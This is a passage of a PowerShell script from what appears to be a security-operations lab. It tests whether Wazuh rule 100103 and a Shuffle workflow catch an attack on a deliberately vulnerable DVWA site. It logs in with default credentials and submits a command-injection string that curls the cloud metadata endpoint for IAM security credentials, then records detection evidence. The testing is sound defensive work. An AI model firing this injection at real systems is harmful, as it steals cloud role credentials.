        if (Test-Path -LiteralPath $Path) { [IO.File]::Replace($temporary,$Path,$backup,$true);Remove-Item -LiteralPath $backup -Force }
        else { [IO.File]::Move($temporary,$Path) }
    } finally {
        Remove-Item -LiteralPath $temporary,$backup -Force -ErrorAction SilentlyContinue
    }
}

function Get-G4LiveSourceEvents {
    param([Parameter(Mandatory)][string]$Path,[Parameter(Mandatory)][string]$TakeId)
    if (-not (Test-Path -LiteralPath $Path -PathType Leaf)) { return @() }
    $file=Get-Item -LiteralPath $Path
    if ($file.Length -gt 128MB) { Throw-G4Failure source_contract }
    $records=[Collections.Generic.List[object]]::new()
    $stream=[IO.File]::Open($Path,[IO.FileMode]::Open,[IO.FileAccess]::Read,[IO.FileShare]::ReadWrite)
    $reader=[IO.StreamReader]::new($stream,[Text.UTF8Encoding]::new($false),$true)
    try {
        while (-not $reader.EndOfStream) {
            $line=$reader.ReadLine();if ([string]::IsNullOrWhiteSpace($line)) { continue }
            if ($line.Length -gt 1048576) { Throw-G4Failure source_contract }
            try { $item=$line|ConvertFrom-Json -Depth 100 } catch { Throw-G4Failure source_contract }
            if ([string]$item.payload.take_id -cne $TakeId -or [string]$item.payload.event_type -cne 'command.execution') { continue }
            $records.Add([pscustomobject]@{
                take_id=[string]$item.payload.take_id;event_id=[string]$item.event_id;source=[string]$item.source
                transport=[string]$item.transport;aws_account_id=[string]$item.aws_account_id;aws_region=[string]$item.aws_region
                normalized=[bool]$item.payload.normalized;event_type=[string]$item.payload.event_type;result=[string]$item.payload.result
                route=[string]$item.payload.route;resource=[string]$item.payload.context.resource
                action=[string]$item.payload.context.action;security_level=[string]$item.payload.context.security_level
                event_time_utc=[string]$item.event_time;bridge_received_at_utc=[string]$item.bridge_received_at
                raw_message_sha256=[string]$item.raw_message_sha256
            })
        }
    } finally { $reader.Dispose();$stream.Dispose() }
    return @($records)
}

function Invoke-G4Live {
    $terraformRoot=(Resolve-Path (Join-Path $PSScriptRoot '..\..')).Path
    $moduleRoot=Join-Path $terraformRoot 'automation'
    Import-Module (Join-Path $moduleRoot 'SocLab.Security.psm1') -Force
    Import-Module (Join-Path $moduleRoot 'SocLab.Runtime.psm1') -Force
    Import-Module (Join-Path $moduleRoot 'SocLab.WazuhEvidence.psm1') -Force
    Import-Module (Join-Path $moduleRoot 'SocLab.Shuffle.psm1') -Force
    Import-Module (Join-Path $moduleRoot 'SocLab.Configuration.psm1') -Force
    Write-Host 'G4 dynamic OBSERVE_ONLY preview: PILOT then TAKE-1..3, one DVWA low event-source request per phase.'
    if ($ConfirmRun -cne 'RUN G4 DYNAMIC OBSERVE ONLY') { throw "Preview only. Re-run with -ConfirmRun 'RUN G4 DYNAMIC OBSERVE ONLY'." }
    $resolvedSecretRoot=Get-SocSecretRoot -Root $SecretRoot
    $resolvedRuntimeRoot=Get-SocRuntimeRoot -Root $RuntimeRoot
    $adminPassword=$null;$shuffleApiKey=$null;$webSession=$null
    try {
        $activePath=Join-Path $resolvedRuntimeRoot 'active-soc-session.json'
        if (-not (Test-Path -LiteralPath $activePath -PathType Leaf)) { Throw-G4Failure operation_failed }
        $state=Get-Content -LiteralPath $activePath -Raw|ConvertFrom-Json
        $sessionPath=[IO.Path]::GetFullPath([string]$state.session_path)
        $prefix=[IO.Path]::GetFullPath($resolvedRuntimeRoot).TrimEnd('\')+'\'
        if ([int]$state.schema_version -ne 1 -or [string]$state.status -cne 'READY' -or
            [string]$state.response_mode -cne 'observe_only' -or
            -not $sessionPath.StartsWith($prefix,[StringComparison]::OrdinalIgnoreCase)) { Throw-G4Failure operation_failed }
        $activeTake=Read-SocTakeRecord -RuntimeRoot $sessionPath
        if ([string]$activeTake.status -cne 'READY' -or [string]$activeTake.response_mode -cne 'observe_only' -or
            [datetimeoffset]$activeTake.expires_at_utc -le [datetimeoffset]::UtcNow.AddMinutes(10)) { Throw-G4Failure operation_failed }
        $heartbeat=Get-Content -LiteralPath ([string]$state.heartbeat_path) -Raw|ConvertFrom-Json
        if ([string]$heartbeat.state -notin @('READY','RUNNING') -or [int]$heartbeat.dlq_visible -ne 0 -or
            ([datetimeoffset]::UtcNow-[datetimeoffset]$heartbeat.heartbeat_at_utc).TotalSeconds -gt 30) { Throw-G4Failure operation_failed }
        [void](Get-Process -Id ([int]$state.bridge_pid) -ErrorAction Stop)
        $lockPath=[IO.Path]::GetFullPath([string]$state.bridge_lock_path)
        if ((Split-Path -Leaf $lockPath) -cne 'wazuh-push-bridge.lock') { Throw-G4Failure operation_failed }
        $livePath=Join-Path (Split-Path -Parent $lockPath) 'wazuh-push-live.jsonl'
        $configuration=Read-SocLabConfiguration -Root $ConfigurationRoot
        $adminPassword=Unprotect-SocSecret -Name 'wazuh_indexer_admin_password' -SecretRoot $resolvedSecretRoot
        $shuffleApiKey=Unprotect-SocSecret -Name 'shuffle_api_key' -SecretRoot $resolvedSecretRoot
        $workflow=Invoke-ShuffleApiRequest -Method GET -RelativePath "/api/v1/workflows/$($configuration.shuffle_workflow_id)" `
            -ApiKey $shuffleApiKey -OrgId ([string]$configuration.shuffle_org_id) -BaseUri ([uri]$configuration.shuffle_api_base)
        $workflowContract=Assert-G4Workflow -Workflow $workflow -WorkflowId ([string]$configuration.shuffle_workflow_id) `
            -WebhookId ([string]$configuration.shuffle_webhook_id)

        $urlText=@(& terraform "-chdir=$terraformRoot" output -raw application_url 2>&1)
        if ($LASTEXITCODE -ne 0) { Throw-G4Failure operation_failed }
        $baseUri=[uri](($urlText|ForEach-Object{[string]$_})-join "`n").Trim()
        if ($baseUri.Scheme -cne 'https' -or -not $baseUri.Host) { Throw-G4Failure operation_failed }
        $webSession=[Microsoft.PowerShell.Commands.WebRequestSession]::new()
        $login=Invoke-WebRequest -Uri ([uri]::new($baseUri,'/login.php')) -WebSession $webSession -TimeoutSec 30
        $token=[regex]::Match([string]$login.Content,'name\s*=\s*["'']user_token["''][^>]*value\s*=\s*["'']([^"'']+)["'']','IgnoreCase')
        $login=$null;if (-not $token.Success) { Throw-G4Failure operation_failed }
        $response=Invoke-WebRequest -Uri ([uri]::new($baseUri,'/login.php')) -Method Post -WebSession $webSession -TimeoutSec 30 `
            -Body @{username='admin';password='password';Login='Login';user_token=$token.Groups[1].Value}
        $response=$null
        $page=Invoke-WebRequest -Uri ([uri]::new($baseUri,'/vulnerabilities/exec/')) -WebSession $webSession -TimeoutSec 30
        $securityCookie=@($webSession.Cookies.GetCookies($baseUri)|Where-Object Name -ceq 'security')|Select-Object -Last 1
        if (-not $securityCookie -or [string]$securityCookie.Value -cne 'low' -or [string]$page.Content -notmatch 'name\s*=\s*["'']ip["'']') { Throw-G4Failure operation_failed }
        $page=$null
        $runId=[datetimeoffset]::UtcNow.ToString('yyyyMMddTHHmmssZ')+'-'+[guid]::NewGuid().ToString('N').Substring(0,8)
        $runDirectory=Join-Path ([IO.Path]::GetFullPath($EvidenceRoot)) $runId
        New-Item -ItemType Directory -Path $runDirectory | Out-Null
        $phaseIndex=@{PILOT='00-PILOT';'TAKE-1'='01-TAKE-1';'TAKE-2'='02-TAKE-2';'TAKE-3'='03-TAKE-3'}
        $ops=@{
            Now={ [datetimeoffset]::UtcNow }
            Sleep={ param($seconds) Start-Sleep -Seconds $seconds }
            NewTakeId={ param($phase) 'capital-one-'+[datetimeoffset]::UtcNow.ToString('yyyyMMddTHHmmssZ')+'-'+[guid]::NewGuid().ToString('N').Substring(0,8) }
            InvokeEvent={ param($takeId)
                $startMarker='__G4_ROLE_BEGIN__';$endMarker='__G4_ROLE_END__'
                $eventSourceInput="127.0.0.1; printf '\n$startMarker\n'; curl -s --max-time 5 http://169.254.169.254/latest/meta-data/iam/security-credentials/; printf '\n$endMarker\n'"
                $result=Invoke-WebRequest -Uri ([uri]::new($baseUri,'/vulnerabilities/exec/')) -Method Post -WebSession $webSession `
                    -Headers @{'X-SOC-TAKE-ID'=$takeId} -TimeoutSec 30 -Body @{ip=$eventSourceInput;Submit='Submit'}
                try {
                    if ([int]$result.StatusCode -ne 200) { Throw-G4Failure operation_failed }
                    $decoded=[Net.WebUtility]::HtmlDecode([string]$result.Content)
                    $start=$decoded.IndexOf($startMarker,[StringComparison]::Ordinal)
                    $end=if ($start -ge 0) {$decoded.IndexOf($endMarker,$start+$startMarker.Length,[StringComparison]::Ordinal)} else {-1}
                    if ($start -lt 0 -or $end -lt 0 -or
                        $decoded.Substring($start+$startMarker.Length,$end-$start-$startMarker.Length).Trim() -cnotmatch '^[A-Za-z0-9+=,.@_-]{1,64}$') {
                        Throw-G4Failure operation_failed
                    }
                } finally { $decoded=$null;$eventSourceInput=$null;$result=$null }
            }
            GetSourceEvents={ param($takeId) @(Get-G4LiveSourceEvents -Path $livePath -TakeId $takeId) }
            GetAlerts={ param($takeId) @(Get-SocWazuhRuleAlerts -TakeId $takeId -RuleId 100103 -AdminPassword $adminPassword -Size 20) }
            GetExecutions={
                $list=@(Get-ShuffleSocWorkflowExecutions -WorkflowId ([string]$configuration.shuffle_workflow_id) `
                    -ApiKey $shuffleApiKey -OrgId ([string]$configuration.shuffle_org_id) -BaseUri ([uri]$configuration.shuffle_api_base) -Top 100)
                if ($list.Count -ge 100) { Throw-G4Failure execution_contract };return $list
            }
            GetExecutionResult={ param($execution)
                Get-ShuffleSocExecutionResult -ExecutionId ([string]$execution.execution_id) `
                    -ExecutionAuthorization ([string]$execution.authorization) -ApiKey $shuffleApiKey `
                    -OrgId ([string]$configuration.shuffle_org_id) -BaseUri ([uri]$configuration.shuffle_api_base)
            }
            WritePhase={ param($phase,$value)
                $path=Join-Path $runDirectory ($phaseIndex[$phase]+'.json')
                Write-G4AtomicJson -Path $path -Value $value -NoReplace
                if (@(Find-SocSecretExposure -Path $path).Count -ne 0) { Throw-G4Failure evidence_unsafe }
            }
            WriteManifest={ param($value)
                $path=Join-Path $runDirectory 'manifest.json'
                Write-G4AtomicJson -Path $path -Value $value
                if (@(Find-SocSecretExposure -Path $path).Count -ne 0) { Throw-G4Failure evidence_unsafe }
            }
        }
        $result=Invoke-SocRule100103DynamicCore -Operations $ops -WorkflowContract $workflowContract `
            -SourceTimeoutSeconds $SourceTimeoutSeconds -DetectionTimeoutSeconds $DetectionTimeoutSeconds `
            -ShuffleTimeoutSeconds $ShuffleTimeoutSeconds -PollSeconds $PollSeconds `
            -StabilityPolls $StabilityPolls -MaxClockSkewSeconds $MaxClockSkewSeconds
        if (@(Find-SocSecretExposure -Path $runDirectory).Count -ne 0) { Throw-G4Failure evidence_unsafe }
        Write-Host 'G4_DYNAMIC_OBSERVE_ONLY_SUCCEEDED=yes'
        return $result
    } finally {
        $adminPassword=$null;$shuffleApiKey=$null;$webSession=$null
    }
}

if (-not $LibraryOnly) {
    try { Invoke-G4Live }
    catch {
        $category=if ($_.Exception.Message -match '^g4:([a-z_]+)$') {$Matches[1]} else {'operation_failed'}
        throw [InvalidOperationException]::new("G4 dynamic OBSERVE_ONLY stopped safely: $category")
    }
}
